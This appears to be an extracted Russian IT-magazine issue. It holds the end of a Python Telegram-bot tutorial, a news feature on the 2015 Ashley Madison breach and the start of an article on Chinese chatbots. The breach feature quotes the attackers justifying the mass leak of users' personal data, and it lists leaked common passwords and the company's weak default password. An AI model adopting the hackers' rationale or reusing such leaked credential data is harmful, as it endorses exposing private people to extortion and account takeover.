что Тони Старк делает роботов, задумчиво шевеля в воздухе цветными голо-
граммами. Увы, нам далеко до Тони Старка. Мы вынуждены обходиться обык-
новенным Python. Для хранения истории действий возьмем SQLite с единствен-
ной таблицей под названием memories.





Теперь займемся описанной выше логикой. Выбрасываем из полученного со-
общения «я» и вопросительный знак, делим его на две части, команду cmd
и действие predicate, после чего решаем, что делать дальше.
Этот алгоритм отправляется в функцию process, которая принимает на входе
базу данных и текст входящего сообщения, а на выходе отдает текст ответа ро-
бота. Функции p_history (история действия), p_stats (статистика по дей-
ствию) и remember` (добавить новую запись) не заслуживают особого внима-
ния: каждая из них сводится к простому запросу SQL.





Отладить диалог можно и в консоли — дедовском диалоговом интерфейсе.





Посмотрим, что получилось.

op$ python tracker.py я прочитал Войну и мир
Запомнил!
op$ python tracker.py я вешу 87 кг
Запомнил!
op$ python tracker.py что я прочитал?
07/27/15: прочитал Сумерки
05/13/15: прочитал 50 оттенков серого
05/06/15: прочитал В поисках утраченного времени

Кажется, все работает. Получающийся диалог в достаточной степени похож на
мокап. Можно переходить к следующей стадии: подключаться к Telegram.
  Большая часть программного интерфейса Telegram сводится к получению
или отправке информации в формате JSON на специальные адреса на серве-
ре мессенджера. В Python есть все необходимое для того, чтобы это делать,
но кому охота возиться с JSON и HTTP-запросами вручную? За пару месяцев,
которые миновали с момента появления API, на GitHub образовалось несколь-
ко неофициальных, но вполне адекватных библиотек, упрощающих взаимо-
действие с Telegram до детсадовского уровня. Мы будем использовать Python
Telegram Bot.

pip install python-telegram-bot

Следующий пункт нашего пути — BotFather. Обычные сервисы раздают ключи
для доступа к своим программным интерфейсам через веб. Telegram распро-
страняет их через сам мессенджер. BotFather выделяет жаждущим программи-
стам токены авторизации и настраивает свойства учетной записи новых ботов.





BotFather

После ввода команды /newbot BotFather поинтересуется названием и именем
нового бота, а затем пожалует адрес и токен, состоящий из 45 цифр и латин-
ских букв. Этот токен понадобится для подключения к API.
Для отправки текстовых сообщений служит метод sendMessage, но с ним есть
одна тонкость. Чтобы отправить сообщение, бот должен знать идентификатор
чата, в который она попадет: chat_id — это первый аргумент sendMessage.
Поскольку создавать чаты может только человек, любое сообщение бота пред-
ставляет собой ответ. Можно понять, почему так сделано. Если бы не это, с по-
мощью ботов было бы слишком легко рассылать непрошеный спам.
   Как узнать о том, что пользователь обращается к боту? Есть два способа.
С одной стороны, можно нетерпеливо долбить серверы Telegram при помощи
метода getUpdates, который возвращает все сообщения, пришедшие с мо-
мента прошлой проверки (или не возвращающего ничего, если к боту никто
не обращался). С другой стороны, можно написать веб-приложение, которое
умеет получать сообщения в виде JSON по POST. Если зарегистрировать его
адрес в Telegram при помощи метода setWebhook, мессенджер будет сам пе-
редавать боту новые сообщения по мере их прибытия. Когда сообщений нет,
бот может прохлаждаться, ничего не делая.
   Понятно, что getUpdates — злодейский выбор. Сотни процессоров бу-
дут приближать климатическую катастрофу, круглые сутки гоняя через поло-
вину планеты тоскливый JSON, в котором сообщается, что полковнику никто
не пишет. Ботам Telegram редко выпадает шанс убить всех людей и уничтожить
мир. getUpdates — это как раз такой шанс, и лучше не будет. Тем не менее
он настолько проще и приятнее, чем webhook, что выхода нет. Будем злодей-
ствовать.
   Если вызвать getUpdates без аргументов, метод попытается вернуть все
принятые сообщения от начала времен (или по крайней мере те из них, о кото-
рых Telegram все еще помнит). Чтобы обуздать его, нужно передать методу
идентификатор обновления, полученный во время прошлого вызова. С поправ-
кой на это цикл взаимодействия с ботом обретает такой вид.
Функции process придется пережить некоторые изменения. Если в первона-
чальной версии она получала текст сообщения пользователя, то теперь мы бу-
дем передавать ей обновление Telegram. Из него можно извлечь все необхо-
димое:  текст  (msg),  идентификатор  чата  (chat_id)  и  идентификатор
пользователя (user_id).





Готовые ответы бота можно на месте переправлять в Telegram при помощи ме-
тода bot.sendMessage(chat_id, text). Важный момент: Telegram отказыва-
ется иметь дело с кодировками, отличающимися от UTF-8. Перед отправкой
текст лучше конвертировать в UTF-8, иначе ошибки неизбежны.





Обрати внимание, что user_id, который в консольной версии не использовал-
ся, теперь действует на всю катушку. Поскольку идентификатор пользователя
учитывается при извлечении истории действий или статистики, каждый поль-
зователь видит только свою информацию. Более сложному боту следовало бы
завести отдельную таблицу для хранения информации о пользователях, но мы
можем обойтись и без нее.
   Запускаем (это можно сделать даже на домашней машине — сервер не тре-
буется), и можно обращаться к боту через Messenger. Самый простой способ
найти его — нажать на адрес, который выдал BotFather (наш бот находится по
адресу https://telegram.me/waste_of_time_bot). Диалог начинается с нажатия на
кнопку «Пуск», которая отправляет боту сообщение /start. Это можно исполь-
зовать: добавим в process проверку, которая замечает сообщение с таким тек-
стом и в ответ объясняет пользователю, что делать дальше. Ту же самую под-
сказку можно применять и в качестве ответа на запросы о помощи.
Первая встреча с ботом

Возможности Telegram не ограничиваются текстом. Его боты могут принимать
и отправлять среди прочего изображения, аудио, документы и видео. Это надо
использовать. Пусть наш трекер прилагает к статистике действия красивую ди-
аграмму. Какая статистика без диаграммы, верно?
   Хотелось бы обойтись малой кровью и не тратить силы на вещи, которые не
относятся напрямую к теме статьи. Рисование графиков свалим на Google: по-
лузаброшенный сервис Google Charts готовит диаграммы в формате PNG, на-
рисованные по данным, которые содержатся в URL. Следующая функция со-
ставляет URL диаграммы Google Charts по списку пар (num,   finished),
извлеченных из таблицы memories.
Диаграмма, сгенерированная Google Charts

Для отправки фотографий служит метод sendPhoto. Он очень похож на
sendMessage, но вместо текста принимает либо идентификатор изображения
на сервере Telegram, либо открытый файл, в котором содержится изображе-
ние, либо адрес изображения в интернете. Вариант с файлом нуждается в по-
яснении: из-за одной небольшой, но неприятной особенности Python Telegram
Bot он должен быть именно файлом и ничем иным. Попытка отдать методу объ-
ект, который реализует интерфейс файла, но не является потомком класса file,
закончится провалом. Это исключает использование, например, временных
файлов, полученных при помощи tempfile, или cStringIO.
  Мы с нашими гугловскими урлами можем игнорировать эти проблемы. У нас
все просто:





Действует? Действует!
Диалог

Еще одна интересная особенность Telegram — специальные клавиатуры с го-
товыми ответами, которые может показать бот. Ты уже видел их, когда общал-
ся с BotFather. Когда приходило время узнать, к чему именно относится наша
просьба, он выкатывал кнопки с названиями всех наших ботов. Кнопка запуска
в начале общения с ботом — еще один пример этой функциональности.
  Наш робот при запуске будет показывать клавиатуру с двумя кнопками: одна
из них запрашивает подсказку, а другая — отправляет команду «что я делал»,
которая выводит список упомянутых в базе данных действий.
   Клавиатуру можно приложить к любому сообщению (в нашем случае она
пойдет в нагрузку к сообщению с подсказкой), но сперва ее нужно приготовить.
Для этого служит класс ReplyKeyboardMarkup.
Аргумент resize_keyboard заставляет клиент Telegram уменьшить кнопки до
осмысленной величины (без него мобильная версия распахнет кнопки на чет-
верть экрана).
   Есть два способа сложить ненужную клавиатуру. Во-первых, можно сразу
передать ReplyKeyboardMarkup аргумент one_time_keyboard, уведомляю-
щий, что клавиатуру следует спрятать, как только она была использована.
Во-вторых, можно отправить в качестве reply_markup результат работы
telegram.ReplyKeyboardHide(). В нашем случае не требуется ни то ни дру-
гое — пускай эта клавиатура будет вечной.





Диалог

Теперь, посмотрев, что нас ждет на темной стороне, выясним, чем плоха сто-
рона добра. Не надо противиться эволюции!
  За основу веб-приложения возьмем микрофреймворк Flask. Часть «микро»
в данном случае означает, что самый простой сайт уместится в три строчки
кода и не потребует десяти файлов и пятнадцати вложенных каталогов. Это
именно наш случай: иметь пятнадцать файлов для такой малости как-то не-
ловко, даже если все они автоматически сгенерированы при помощи специ-
альной утилиты.

pip install flask

Тремя строчками, впрочем, тут не обойтись, база данных не велит. Нам потре-
буется функция, которая открывает базу данных при необходимости, и другая,
чтобы закрыть ее, когда необходимость отпала. В настройках приложения при-
дется указать название сервера, на котором установлено веб-приложение, —
это нужно при его регистрации в Telegram.





Дальше легче. Фактически можно обойтись двумя адресами. Адрес /receive
будет принимать обновления Telegram, переводить JSON в объекты python-
telegram-bot путем вызова telegram.Update.de_json, а затем отправлять до-
бытое уже известной нам функции process. Это главное.





Другой адрес потребуется лишь однажды. При открытии он регистрирует адрес
/receive в Telegram при помощи метода setWebhook.
И это все? Увы, на самом деле страдания лишь начинаются! Telegram отказы-
вается иметь дело с ботами, которые обитают на серверах, не поддерживаю-
щих защищенное соединение. И не просто защищенное — самодельный сер-
тификат SSL не сгодится, нужно приобретать настоящий. Разумеется, в этом
нет ничего невозможного (и даже по большому счету трудного), но при отсут-
ствии практики этот процесс рискует занять куда больше времени, чем написа-
ние самого бота, не говоря уже о средствах. В конце у тебя будет либо готовый
робот, либо желание убить всех людей и уничтожить мир. Можно считать, что
ситуация беспроигрышная.
X-Mobile
ПАДЕНИЕ
ASHLEY
MADISON
КАК ХАКЕРЫ
РАЗОБЛАЧИЛИ
НЕЧЕСТНЫЙ САЙТ
ЗНАКОМСТВ И ЕГО
ПОЛЬЗОВАТЕЛЕЙ


Взломы, утечки данных, обнаруже-
ние новых 0day-уязвимостей — все
это происходит каждый день, но не-
которые события выбиваются из об-                                                                 Мария Нефёдова
                                                                                    nefedova.maria@gameland.ruщего ряда. Взлом сайта знакомств
Ashley Madison не был обычным.
Это масштабная история о том,
как хакеры объявили войну крупной
компании и победили, не считаясь
с «сопутствующим ущербом».
УЛЬТИМАТУМ
Крупные утечки данных и скандальные взломы — настоящий тренд этого лета.
Весь июль и эксперты в области информационной безопасности, и пользова-
тели изучали огромный архив внутренних данных (400 Гбайт) компании Hacking
Team — поставщика и производителя шпионского софта и различных хакер-
ских инструментов для спецслужб и полиции со всего мира.
   Конец июля и начало августа 2015 года принесли новую тему для обсуж-
дений. Атаке подвергся огромный и очень популярный сайт знакомств (более
37 миллионов пользователей) Ashley Madison. Возможно, атака не привлекла
бы к себе такого внимания, если бы не два но.  Во-первых, направленность
Ashley Madison и двух его «сайтов-побратимов» (Cougar Life и Established Men)
сложно назвать обычной. Ashley Madison и два других ресурса ориентирова-
лись на уже состоящих в отношениях людей, которые ищут романа на стороне.
Канадская компания Avid Life Media, которой принадлежат «сайты для измен»,
неоднократно подвергалась критике за провокационные рекламные кампа-
нии и слоганы вроде «Жизнь коротка. Заведи интрижку».
    Во-вторых, сайт не просто взломали или дефейснули — атаке подверглась
сама компания Avid Life Media, а не только ее ресурсы. Группа хакеров, которые
называют себя The Impact Team, объявила Avid Life Media официальную войну.
  О взломе стало известно 19 июля 2015 года, хотя позже выяснится, что
первые предупреждения хакеры послали компании 12 июля. Утром того дня
на компьютерах служащих Avid Life Media внезапно заиграл трек Thunderstruck
группы AC/DC. Именно эту песню в 2012 году использовали хакеры, атаковав-
шие иранские ядерные объекты. Песня сопровождалась демонстрацией ульти-
матума. Хакеры потребовали от руководства компании полного прекращения
работы сайтов Ashley Madison и Established Men (ресурс Cougar Life, ориен-
тированный на женщин, взломщики почему-то обошли вниманием). В против-
ном случае The Impact Team пригрозили опубликовать данные пользователей,
украденные в ходе атаки, а также внутреннюю документацию самой компании.
  В своем послании The Impact Team уверяли, что не требуют невозможного.
Хакеры выразили понимание: полная остановка столь масштабного бизнеса
займет время и приведет к огромным финансовым потерям. Но также они от-
метили, что, если в открытом доступе действительно окажется абсолютно вся
подноготная 37 миллионов изменщиков и изменниц, компании Avid Life Media
придется еще хуже.
   Почему хакеры выбрали Ashley Madison из всего многообразия сайтов зна-
комств? Мишенью стал не сайт, а именно компания Avid Life Media. Члены The
Impact Team утверждали, что компании лгала пользователям, зарабатывая
на них миллионы долларов. Речь о функции Full Delete, которую Ashley Madison
предлагает своим пользователям. Дело в том, что ресурс позиционировал-
ся как в высшей степени конфиденциальный (что совсем неудивительно),
Ультиматум The Impact Team

но удалить оттуда свои данные можно было, только заплатив 19 долларов, то
есть воспользовавшись платной услугой полного удаления аккаунта с серве-
ров компании. The Impact Team утверждали, что функция Full Delete — обман
и пользовательские данные не удалялись вовсе, зато Avid Life Media получала
огромные прибыли.
Полное удаление данных всего за 19 долларов

Одним из первых о происходящем сообщил известный журналист и специа-
лист в сфере ИБ Брайан Кребс. Он же рассказал о том, что The Impact Team
настроены серьезно и в качестве доказательства своих намерений уже опу-
бликовали небольшой процент украденных данных.

ПУБЛИКАЦИЯ ДАННЫХ  
Вряд ли кто-то ожидал того, что произошло спустя месяц после объявления
ультиматума. Компании Avid Life Media было дано тридцать дней на выполне-
ние требований, и хакеры оказались пунктуальными ребятами.
    19 августа 2015 года члены The Impact Team сообщили, что время вышло,
и действительно выложили в сеть архив размером 9,7 Гбайт. Он содержал ин-
формацию о 32 миллионах пользователей Ashley Madison и 36 миллионов элек-
тронных адресов. Информация о каждом человеке исчерпывающая: полное
имя, адрес, телефон, хеши паролей (bcrypt), а также данные, важные для зна-
комств, — вес, рост, цвет волос и так далее. Более того, во многих случаях ин-
формация об аккаунте содержит GPS-координаты. Очевидно, приложение от-
слеживало пользователей принудительно, даже если те не указывали адрес.
Обнаружились в архиве и данные о банковских картах. Полные номера карт
не раскрыты, зато есть имя владельца и адрес.
    Кроме того, архив содержал информацию об аккаунтах руководства Ashley
Madison на PayPal, данные Windows Domain, предназначенные для сотрудни-
ков, и огромное количество внутренней документации компании Avid Life Media
(логи чатов, контракты, техники продаж и многое другое).


                                                              «Время вы-
                                                                      шло!»





Эксперты со всего мира принялись анализировать данные, в первую очередь
пытаясь понять, подлинные ли они. В Twitter с каждой минутой появлялось все
больше сообщений от людей, которые нашли себя в базе. Сомнений почти
не оставалось.
    Брайан Кребс, в свою очередь, не только провел расследование, но и по-
общался с одним из основателей Ashley Madison и бывшим техническим ди-
ректором компании Раджей Бхатией (Raja Bhatia). Бхатия сейчас консультиру-
ет Avid Life Media и помогает в расследовании инцидента. Как ни странно, он
отрицал, что данные в архиве настоящие. По его словам, компания ежедневно
получает от 30 до 80 предупреждений об утечках данных, проверяет сотни ги-
габайтов информации, но это всегда оказывается ложная тревога.
    По словам бывшего технического директора, часть данных в архиве на-
стоящие, но это те же самые данные, которые хакеры опубликовали в июле,
в качестве доказательства серьезности своих намерений. Остальная инфор-
мация — подделка или данные, собранные из других источников, которые
не имеют к Ashley Madison никакого отношения.
    Бхатия особенно подчеркнул, что компания Avid Life Media не хранит дан-
ные о банковских картах пользователей, вместо них используя обезличенные
ID транзакций. По мнению бывшего технического директора, данные о бан-
ковских картах взяты из совершенно иных источников.
  Словам представителей Avid Life Media сложно было поверить уже после
первого опубликованного хакерами архива. Но The Impact Team на достигну-
том не остановились. 21–22 августа 2015 года хакеры вслед за первым дампом
опубликовали второй, а затем и третий архив с украденными данными. Тре-
тья выкладка потребовалась «по техническим причинам»: второй архив объ-
емом 20 Гбайт, который содержал в основном документы и более 200 тысяч
писем компании Avid Life Media, оказался «битым» — не открывалось порядка
13 Гбайт файлов. Хакеры поспешили исправить оплошность и опубликовали
рабочий архив, который насчитывал 19 Гбайт и уже открывался, как положено.
    Вместе со вторым архивом было опубликовано и послание: «Эй, Ноэль, те-
перь ты можешь убедиться, что все это настоящее». Имелся в виду основатель
и руководитель Avid Life Media Ноэль Бидерман (Noel Biderman).

Слово The Impact Team

Когда были опубликованы все три дампа, издание Motherboard сумело раздо-
быть контактный email группы (через посредника, чье имя не было названо). Жур-
налисты отправили хакерам письмо, с просьбой выйти на контакт. Как ни стран-
но, ответ не заставил себя ждать и, что немаловажно, был подписан тем же
PGP-ключом, что и дампы данных по Ashley Madison. Парни из The Impact Team
согласились ответить на вопросы журналистов. Вот перевод этого недлинного
интервью.
  — Как вы взломали Avid Life Media? Это было сложно?
 — Мы очень старались и планировали атаку, которую будет невозможно
обнаружить, но, когда перешли к действиям, поняли, что преодолевать там по-
просту нечего.
  — Что скажете об их безопасности?
 — Она ужасна. Никто ни за чем не следил. Никакой безопасности. Един-
ственное — сеть была сегментирована. Можно использовать Pass1234 из ин-
тернета, чтобы под VPN получить root-доступ на всех серверах.
  — Когда вы начали их ломать? Несколько лет назад?
 — Довольно давно.
Отрывок из файла README, приложенного к первому дампу. Хакеры пишут, что собирают ин-
формацию о компании «на протяжении пары последних лет»

  — Какой еще информацией о Avid Life Media вы располагаете?
 — 300 Гбайт данных: переписка сотрудников, документация из внутренней
сети компании. Десятки тысяч фотографий пользователей Ashley Madison. Не-
которое количество чатов пользователей и их сообщения. Треть всех фото-
графий, это фотографии членов, их мы публиковать не будем. Большую часть
почты сотрудников мы тоже не собираемся публиковать. Возможно, только пе-
реписку руководителей компании.
  — Почему вы решили выложить дампы сразу большими порциями,
а не сливали информацию понемногу?
 — Мы как-то непонятно пишем? План всегда был именно такой. Наш пер-
вый релиз содержал образец дампа с 2700 транзакциями. По одной, начиная
с 2008-03-21 и по 2015-06-28. По одной за день. Потом мы опубликовали все
остальное. Так гораздо проще.
  — Что скажете о реакции Avid Life Media и ее исполнительного ди-
ректора Ноэля Бидермана?
 — Они зарабатывают на мошенничестве 100 миллионов долларов в год.
Совсем неудивительно, что компания не закрылась. Может быть, теперь их
смогут закрыть юристы. Руководители Avid Life Media совсем как политики —
не могут перестать врать. Они заявляют, что не хранили данные о банковских
картах. Конечно, а еще они совсем не хранили email, просто каждый день логи-
нились на сервер и читали. У них был пароль от обработчика банковских карт
(CC processor), мы слили данные оттуда.
   То есть они работают с процессинговой компанией, оператором по приему
платежей. Процессинговая компания хранит у себя часть номера банковской
карты и биллинг-адрес. Так же Gmail хранит почту. Avid Life Media могли залоги-
ниться и просмотреть детали транзакций.
  — Что подвигло вас на взлом, какова мотивация?
 — Мы пробыли в Avid Life Media достаточно долго, чтобы разобраться, что
к чему. Мы наблюдали, как растет число пользователей Ashley Madison, растет
посещаемость сайта. Сейчас все кричат: «37 миллионов пользователей! Шан-
таж пользователей!» Мы не шантажировали пользователей. Их шантажирова-
ла Avid Life Media. Но могла бы и любая другая группа хакеров. Мы лишь оста-
новили это, пока дело не дошло до 60 миллионов. Avid Life Media ведет себя
как драгдилер, издевающийся над наркоманами.
  — Доказательства того, что функция удаления профиля с сайта
не работала, есть в дампах?
 — Да. Там множество таких аккаунтов и данных.
  — The Impact Team планирует взламывать другие сайты в будущем?
Если да, то какие конкретно цели или какой тип целей у вас на примете?
 — Мы будем ломать не только сайты. Наши цели — любые компании, кото-
рые зарабатывают сотни миллионов долларов на человеческой боли, секре-
тах и лжи. Возможно, коррумпированные политики. Если мы за это возьмемся,
это займет много времени, но мы поработаем тотально.



ПОСЛЕДСТВИЯ
Разумеется, компрометация данных 32 миллионов человек, которые изменя-
ли или собирались изменять своим супругам, не могла остаться незамечен-
ной и не повлечь за собой последствий. Так, оперативно появились сайты,
где можно проверить свои данные по базе и узнать, не скомпрометирован
ли твой аккаунт.
  Предприимчивые сетевые мошенники начали рассылать пострадав-
шим письма с попытками вымогательства. Такие рассылки носят настолько
массовый характер, что некоторые почтовые провайдеры были вынуждены
обновить спам-фильтры, чтобы отсекать подобные сообщения. От схожих
писем могут страдать даже те, кто никогда не регистрировался на сайтах
знакомств. Дело в том, что принадлежащие Avid Life Media ресурсы не тре-
бовали подтверждения по email, можно было указывать любой адрес, хоть
barack.obama@whitehouse.gov.
    Неизвестный вымогатель «с прискорбием» сообщает жертве о том, что ин-
формация с сайта Ashley Madison оказалась в его руках. Чтобы оградить лю-
бимую жену от получения этой информации, жертву просят перечислить один
биткойн на определенный адрес. Точнее, требуется перечислить, к примеру,
1,0000001 BTC, чтобы вымогатель знал, кто именно откупился. Вероятно, ка-
ждая жертва получает требование о выкупе с уникальной суммой (1,0000002
BTC, 1,0000003 BTC и так далее).
Образчик вымогательского письма

Адвокаты по разводам (и адвокаты вообще) тоже заинтересовались проис-
ходящим. Сложно представить, какое количество разводов и мошенничества
повлечет за собой публикация данных 32 миллионов человек, пойманных
на измене (или по крайней мере попытках, учитывая почти полное отсутствие
настоящих женщин). Хотя это еще не самое страшное. На Reddit, к примеру,
мелькала история гея из Саудовской Аравии, который использовал Ashley
Madison для знакомств. Дело в том, что в Саудовской Аравии и ряде других
стран мужеложство карается смертной казнью. Через побивание камнями. Па-
рень пишет, что уже подготовил побег из страны и «очень благодарен» за это
хакерам.
  На Avid Life Media уже начали подавать групповые иски, что совершенно
неудивительно, учитывая размах утечки данных и скандала вокруг нее. В суд
подают и в Канаде, где зарегистрирована фирма, и в других странах. Так,
в США в окружной суд штата Калифорния на днях как раз поступил новый иск
с требованием возместить 5 миллионов долларов пострадавшим. И это явно
только начало.

Женщин на Ashley Madison почти не было  

Редактор сайта Gizmodo Аннали Ньюиц проанализировала опубликованные
хакерами данные и пришла к забавному выводу: настоящих женщин на Ashley
Madison было очень немного.
• 5 550 678 аккаунтов якобы принадлежат женщинам, и 31 343 428 аккаунтов
  принадлежат мужчинам.
• Множество «женских» аккаунтов зарегистрированы на почту
  @ashleymadison.com.
• 1492 женщины реально открывали сообщения на сайте и проявляли хоть
  какую-то активность. Ерунда по сравнению с 20 269 657 мужчинами.
• 2409 женщин пользовались чатом. И 11 030 920 мужчин
• 80 805 аккаунтов зарегистрированы с IP-адреса 127.0.0.1, то есть, скорее
  всего, созданы сотрудниками Ashley Madison.
• Если мужчин с IP 127.0.0.1 насчитывается всего 12 069, то женщин 68 709.



FULL DELETE И ПОДНОГОТНАЯ AVID LIFE MEDIA
Так как второй (технически — третий) дамп, опубликованный хакерами, содер-
жал в основном внутреннюю документацию компании Avid Life Media, на свет,
разумеется, вышли не самые приглядные факты о самой компании, а также
о ее руководстве.
   Выяснилось, что функция удаления данных, за которую ALM просила у поль-
зователей 19 долларов, все же работала, хотя и весьма странно. Многие дан-
ные об аккаунте действительно удалялись, но в базе все равно хранились: ин-
формация о штате, городе и стране проживания, GPS-координаты, параметры
роста и веса, дата рождения, пол, а также информация о привычках и предпо-
чтениях пользователя. Немало, учитывая, что человек заплатил почти двадцать
баксов за полное удаление своего профиля. Неприятнее всего утечка геолока-
ции, по которой человека можно выследить и вычислить, даже не зная имени.

                                                                      Сравнитель-
                                                                      ная таблица
                                                                  данных
                                                                       об удален-
                                                                 ном и актив-
                                                                 ном аккаун-
                                                                                      тах. Красным
                                                                     замазана
                                                                    информация,
                                                                        которая
                                                                  может
                                                                      привести
                                                                        к идентифи-
                                                                   кации
                                                                        пользовате-
                                                                     ля

Обнаружилась в архиве и переписка руководителей компании, которая вы-
ставляет ALM в не слишком выгодном свете. В частности, был найден обмен
письмами между Бхатией и Бидерманом, датированный 2012 годом. Бхатия,
тогда еще технический директор компании, пишет шефу, что на досуге поко-
пался на сайте конкурирующей службы знакомств, работающей при издании
nerve.com, и обнаружил там уязвимость. Бидермана информация заинтересо-
вала, и он попросил подробностей, которые CTO с радостью предоставил:
   «Я провел ленивый аудит сайта. Получил доступ ко всем пользовательским
данным, включая email, пароли, зашифрованные пароли. Доступна информа-
ция о том, платил ли пользователь, с кем он разговаривал, что искал, когда
последний раз был на сайте, кого занес в черный список и кем был занесен
в черный список. Доступен профиль на каждого по риску мошенничества, за-
грузки фото и так далее».
  Бидерман ответил весьма однозначно: «Ничего себе... Я бы взял оттуда
имейлы...» И хотя Бхатия вроде бы изначально не собирался ломать конкурен-
тов дальше и внедряться глубже, он пояснил Бидерману, как работает уязви-
мость, и сопроводил свой «отчет» залитым на GitHub дампом БД nerve.com.
    Переписка фактически обрывается на вопросе Бидермана: «Может, стоит
сообщить им о дыре в системе?», на который Бхатия так и не ответил, во вся-
ком случае по почте.
   Хотя сами Бидерман и Бхатия не стали давать комментарии, представители
ALM сообщили прессе, что все это вырвано из контекста: «Ничто не указывает
на то, что кто-то пытался взломать nerve.com, украсть или использовать при-
надлежащие им данные». Якобы вместо этого руководство компании просто
«проявило должную техническую осмотрительность, использовав предста-
вившийся случай».
    Дело в том, что за полгода до этого обмена письмами ALM вела перего-
воры о партнерстве с Nerve и о приобретении ресурса flirts.com. Переговоры
ни к чему не привели, но, видимо, в таком «прощупывании» конкурентов и их
товара, по мнению ALM, нет ничего зазорного.

ПОИСК ВИНОВНЫХ  
24 августа 2015 года полиция Торонто провела пресс-конференцию. Пред-
ставитель полиции Торонто Брайс Эванс рассказал о ходе расследования. Он
признал, что «было бы глупо полагать, что полиция Торонто справится с этим
самостоятельно», и подтвердил, что к делу привлекли не только местные пра-
воохранительные органы. Задействованы спецслужбы США, в числе которых
ФБР и министерство национальной безопасности. Последнее официально
заявило, что расследует возможность компрометации федеральных служа-
щих в ходе инцидента. Канадская служба разведки и безопасности (аналог
ЦРУ) в расследовании, напротив, не участвует.
Представители полиции Торонто на пресс-конференции

Несмотря на то что «вся королевская конница и вся королевская рать» ищут
хакеров, результатов пока мало. По словам Эванса, полиция обеих стран ищет
помощи у хакерского комьюнити, в основном у white hat специалистов, рас-
считывая на их экспертизу. Однако если кто-то из сетевого андеграунда вдруг
решит «настучать» на коллег на цеху, полиция примет и такую помощь.
    Кроме того, полицейские объявили, что компания Avid Life Media устано-
вила вознаграждение в размере 500 тысяч канадских долларов (в долларах
США — 376 тысяч) за любую информацию, которая поможет поймать и иден-
тифицировать членов The Impact Team.
  Свою гипотезу о личностях хакеров уже выдвинул Брайан Кребс. 20 июля
2015 года, через несколько часов после того, как Кребс опубликовал эксклю-
зивный материал о взломе Ashley Madison, получив данные от представителей
The Impact Team, Кребс заметил странный твит некоего Тадеуша Зу (Thadeus
Zu). Зу давал ссылку на тот самый дамп с данными, которых еще никто не ви-
дел и видеть попросту не мог.
    Кребс скачал весь пятилетний архив твитов Зу и проанализировал их.
Из архива становится ясно, что это опытный хакер, который поначалу публико-
вал информацию о простых взломах маршрутизаторов, беспроводных камер
и дефейсах сайтов, а затем переключился на более сложные атаки.
    Особое внимание журналиста привлек тот факт, что в 2012 году Зу угрожал
взломать сайт группы компьютерных специалистов CERT Nederlands, упоми-
ная при этом песню Thunderstruck, которую в The Impact Team использовали
при взломе Ashley Madison.





Один из подозрительных твитов Зу


    Также 19 июля 2015 года в 9:40 утра Зу разместил твит странного содержа-
ния: об установке «серверов репликации» и начале некоего «шоу». Это случи-
лось примерно за двенадцать часов до того, как с Брайаном Кребсом впервые
связались представители The Impact Team. Кстати, к твиту приложен скриншот,
на котором во вкладках браузера опять виден трек Thunderstruck. Кто такой
Тадеуш Зу и даже где он обитает, пока неясно. То Зу пишет об Австралии, то
становится ясно, что он в Канаде, а его профиль в Facebook вообще указывает
на Гавайи. Как бы то ни было, Кребс убежден: Зу либо причастен к атаке, либо,
как минимум, знает членов The Impact Team.
   Как ни странно, компания Avid Life Media по-прежнему надеется выкарабкать-
ся из этого скандала, а ресурсы Ashley Madison и Established Men продолжают
свою работу. Очевидно, компанию не пугают многомиллионные иски (которые
пострадавшие явно выиграют) и полная потеря доверия со стороны пользова-
телей.
    Более того, в Avid Life Media придумали, кого в сложившейся ситуации
можно сделать идеальным козлом отпущения — Ноэля Бидермана. Обраще-
ния The Impact Team были направлены к нему и еще некоторым руководящим
сотрудникам. Ультиматум The Impact Team, к примеру, содержал не только
требования в адрес Бидермана, но и извинения перед Марком Стилом (Mark
Steele) — шефом безопасности ресурса Ashley Madison.





Бывший исполнительный директор компании Ноэль Бидерман
28 августа 2015 года компания Avid Life Media выпустила лаконичный пресс-ре-
лиз, в котором сообщила, что Ноэль Бидерман оставил пост главы компании,
покинув ее совсем. «Данные перемены предприняты в лучших интересах ком-
пании и позволят нам дальше поддерживать наших пользователей и предан-
ных сотрудников. Мы остаемся верны своим обязательствам перед нашими
клиентами. Ведется активное расследование атаки, предпринятой преступни-
ками против нашего бизнеса и наших пользователей. Мы и далее будем пре-
доставлять доступ к нашим уникальным платформам пользователям со всего
мира», — сказано в пресс-релизе.
    На посту Бидермана сменит группа топ-менеджеров, пока не будет найде-
на новая кандидатура на должность исполнительного директора. Хотя в свете
многочисленных судебных исков и маячащего на горизонте банкротства это
очень оптимистичные планы. Так, Avid Life Media уже пришлось забыть о гото-
вившемся выходе на биржу. От размещения акций на Лондонской фондовой
бирже планировалось выручить до 134 миллионов фунтов стерлингов (около
200 миллионов долларов).

Худшие пароли Ashley Madison  
Во время любой крупной утечки данных всегда находится тот, кто проанализи-
рует статистику паролей скомпрометированных пользователей. Эксперт Дин
Пирс (Dean Pierce) провел такой анализ для Ashley Madison, расшифровав 4000
паролей (0,0006% от общего числа). Вот самые популярные из них.

                                     696969            23                  Сколько раз    Пароль                                              111111             21                  встречается
                                                      football            20
     123456           202              fuckyou            20
     password           105             madison           20
      12345            99               asshole            19
      qwerty            32             superman           19
    12345678           31              fuckme            19
       ashley            28              hockey            19
      baseball            27            123456789           19
     abc123            27                 hunter             19
Сцена

СЛУШАЮ
И ПОВИНУЮСЬ


    КАК КИТАЙСКАЯ МОДА ГОВОРИТЬ
      С БОТАМИ ПОКОРЯЕТ МИР





                                          Олег Парамонов
                                               paramonov@sheep.ru
Пока весь мир сосредоточенно клепал мобильные
приложения, в Китае придумали, как превратить
в универсальную платформу обыкновенные мессен-
джеры. Теперь к китайскому опыту присматриваются
в Кремниевой долине.

Кроме детективов про Шерлока Холмса, у Артура Конан-Дойла есть книжка
под названием «Затерянный мир». Ее герои открывают горное плато, кото-
рое настолько изолировано от остального мира, что там до сих пор обитают
динозавры.
   Китайский интернет — как раз такой затерянный мир. Протекционизм, язы-
ковой барьер и пресловутый китайский файрвол создали там среду, в которой
даже самые обыкновенные технологии то и дело используются не вполне обык-
новенным образом, и порой — с крайне интересными результатами.
   Google, Facebook и Amazon плохо знакомы китайскому пользователю. У Ки-
тая свои интернет-гиганты — Tencent, Alibaba и Baidu. И своя специфика.
   Основа бизнеса Tencent, одного из китайских интернет-гигантов, — не по-
иск, соцсети или онлайновая торговля, а интернет-мессенджеры. Компании
принадлежит мессенджер QQ, у которого порядка 650 миллионов активных
учетных записей, и мобильное приложение WeChat, имеющее более 400 мил-
лионов активных пользователей.
   Google в любом начинании отталкивается от своего главного продукта —
поисковой системы. Facebook изо всех сил пытается превратить свою соци-
